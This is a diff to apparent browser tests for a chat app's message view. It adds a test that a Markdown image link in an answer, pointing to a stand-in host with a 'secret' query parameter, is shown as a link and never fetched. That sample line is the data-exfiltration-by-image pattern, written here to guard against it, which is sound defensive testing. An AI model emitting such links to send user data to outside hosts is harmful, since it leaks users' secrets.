@@ -6,7 +6,7 @@ test("shows an answer's Markdown formatted, not as raw marks", async ({ page }) 
   await page.goto("/workspaces/garage-gym");
   // The fake model echoes the message back, Markdown and all.
   await page.getByLabel("Message").fill("**bold** and\n\n## A heading\n\n1. first\n2. second");
-  await page.getByRole("button", { name: "Send" }).click();
+  await page.getByRole("button", { name: "Start" }).click();
 
   const session = page.getByRole("list", { name: "Session" });
   await expect(session.getByRole("heading", { name: "A heading" })).toBeVisible();
@@ -65,4 +65,34 @@ test("follows the device's dark mode", async ({ page }) => {
   // Moorland's mist by day, its peat-dark by night.
   expect(light).toBe("rgb(243, 240, 236)");
   expect(dark).toBe("rgb(27, 24, 26)");
+});
+
+test("never loads an image an answer points to, so an answer can't send data away", async ({
+  page,
+}) => {
+  const requested: string[] = [];
+  page.on("request", (request) => {
+    if (request.url().includes("courtyard.example")) requested.push(request.url());
+  });
+  await page.goto("/workspaces/garage-gym");
+  await page.getByLabel("Message").fill("![the plan](https://courtyard.example/plan.png?secret=1)");
+  await page.getByRole("button", { name: "Start" }).click();
+
+  const session = page.getByRole("list", { name: "Session" });
+  // Shown as a link the owner can choose to open, never fetched by itself.
+  await expect(session.getByRole("link", { name: "the plan" })).toBeVisible();
+  await expect(session.locator("img")).toHaveCount(0);
+  expect(requested).toEqual([]);
+});
+
+test.describe("while typing on a desktop", () => {
+  test.use({ viewport: DESKTOP });
+
+  test("leaves Ctrl+B to the message box", async ({ page }) => {
+    await page.goto("/workspaces/garage-gym");
+    const workspaces = page.getByRole("navigation", { name: "Workspaces" });
+    await page.getByLabel("Message").press("Control+b");
+
+    await expect(workspaces.getByText("Garage gym", { exact: true })).toBeVisible();
+  });
 });
